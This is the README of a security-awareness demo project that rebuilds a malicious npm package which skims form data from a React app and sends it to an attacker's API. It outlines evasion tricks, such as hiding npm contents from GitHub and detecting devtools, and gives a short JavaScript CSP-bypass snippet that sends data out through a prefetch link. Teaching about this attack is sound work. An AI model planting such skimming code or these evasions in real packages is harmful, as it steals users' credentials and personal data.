If you're like me, you have grown to love how productive you can be using NPM. There is a staggering number of common problems that have already been solved. As developers, we tend to have a great deal of trust towards NPM and the code that it hosts. How often do we carefully examine the code we are about to import into our projects?

The following project aims to show the dangers of blindly importing NPM modules. It shows how just because you can see the code on Github does not mean the module you are importing is safe. It also demonstrates how all it takes is one disgruntled employee to start harvesting user's data, both silently and indefinitely. It shows just how hard it is to sniff out such an attack by utilizing some clever tricks. Finally, it aims to show how as our javascript project's dependencies grow, our risk of being affected by such an attack increases dramatically.

##### Credit

This entire project is based off [this Medium Post](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5). Credit to it's author, David Gilbertson, for all the ideas and even some of the code.

##### What all is here?

1. A basic React app with some form inputs that we will harvest
    * Created with create-react-app
    * found in /demo/src
2. A npm module, 'bad_juju', that will house our malicious code while presenting itself as a useful module
    * found in /node_modules/bad_juju
3. An api to receive the form data
    * Express server

##### Running the React Application

```javascript
# within demo dir
> yarn
> yarn start
```

##### Running the API

```javascript
# within demo dir
> yarn
> node ./api
```

##### How does the attack work?

1. User creates seemingly useful node_module
2. When imported, our node_module applies exploit to all forms on the site/application
3. Send all form data to an API - this should a) not be visible to humans and b) appear as though its just an analytics link
4. Be clever about how/when we send the form data and use all the information available to judge how safe it is to send
5. Make Pull Requests to Open Source projects and attempt to add our dependency to the project
6. Sit back and watch the data pour in

##### What shows in Github is not necessarily what is in NPM
using .gitignore, .npmignore, and the files configuration option in our package.json, we can have different code in NPM than what shows in Github. So you really have no clue what code you are running from NPM, even if you have complete access to the github source. The only way to check this would be to check the 3 config files from the first sentence of this section. I bet you don't do that every time you install an NPM module, do you?


##### Content Security Policy
This is supposed to be our saving grace, right? Wrong. In Chrome, we can bypass the content security policy using the following code
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```

##### Why is NPM the distribution method?
When we add a dependency to our project, NPM will automatically pull in all of this new dependency's dependencies. This means that if one popular package gets infected, it will likely spread to hundreds or thousands of smaller packages. An infected top level package would be bad news for everyone. Remember left_pad?

##### So what... I can never use NPM modules?
Well that certainly is one option... If you truly want to ensure that you will never fall victim to this attack, you must isolate any pages with sensitive form data outside of the scope of the NPM modules. Example, for a login or checkout screen, you may want to embed an isolated page within an iFrame. This way no offending code will be able to attack the content with the iFrame. As a simple solution, one could stick to some good old fashion HTML.

##### Presenting this content
I created this project for a couple of reasons, namely, to recreate what David Gilbertson has described in his blog post. I ended up having a ton of fun setting this up, and wanted to turn it into a short talk - not unlike those you may find at a developers conference. 

Without further ado, here's the order I settled on when presenting:

1) Background terminology
    * What is NPM?
    * What is Content-Security-Policy? CORS?
    * What is fetch?
2) Demo the React Application + Look at the App/Form code
3) Demo the api + Look at the api code
    * Reminder that in the real world, the domain would look like an analytics site
4) Toggle on various checks in the code
    1) QA working
    2) Devtools open (The Heisenberg Manuever)
    3) Randomize attempts
    3) Known Devices
    4) In Dev/UAT/QA/Staging environment
5) Gitignore and Npmignore tricks
6) Obfuscated fetch (cipher technique + EventSource API)
7) Content-Security-Policy Bypasses
    * Append created link element w/ prefetch
    * report-uri not explicitly set
    * default-uri not explicitly set
    * Pre-reading the active Content-Security-Policy and acting on it
    * undefined form-action override
      * only perform once and bounce back - hope the user just shrugs it off
8) What can you do about it?
9) Questions/Comments


##### Possible Improvements
* Failed api requests should fail silently
* Make the Content-Security-Policy configurable on both ends
* This demo got more involved than I was anticipating, proper tests around the exploit would be nice.
* A more elegant (read: functional) way to configure/run the various safety nets

